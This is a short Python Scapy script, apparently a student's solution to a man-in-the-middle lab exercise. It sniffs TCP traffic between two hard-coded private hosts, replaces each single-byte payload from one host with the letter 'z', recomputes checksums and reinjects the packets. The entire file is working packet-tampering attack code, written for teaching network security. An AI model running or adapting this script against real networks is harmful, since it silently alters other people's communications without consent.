#!/usr/bin/env python3
from scapy.all import *

IP_A = "192.168.100.5"
MAC_A = "08:00:27:21:6f:67"
IP_B = "192.168.100.12"
MAC_B = "08:00:27:72:19:8f"
NEW_DATA = 'z'


def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        # Create a new packet based on the captured one.
        # 1) We need to delete the checksum in the IP & TCP headers,
        # because our modification will make them invalid.
        # Scapy will recalculate them if these fields are missing.
        # 2) We also delete the original TCP payload.
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)
        #################################################################
        # Construct the new payload based on the old payload.
        # Students need to implement this part.
        if pkt[TCP].payload:
            data = pkt[TCP].payload.load # The original payload data
            if len(data) == 1: # if the data length is 1 we will replace it with z
                data_prev = data
                data = NEW_DATA.encode() # we encode the letter z and change the data
                if data != data_prev:
                    print(f"data before attack is {data_prev}")
                    print(f"data after the attack is {data}")
            newdata = data # No change is made in this sample code
            send(newpkt/newdata)
        else:
            send(newpkt)
        ################################################################
    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        # Create new packet based on the captured one
        # Do not make any change
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt)



f = 'tcp'
pkt = sniff(iface='enp0s3', filter=f, prn=spoof_pkt)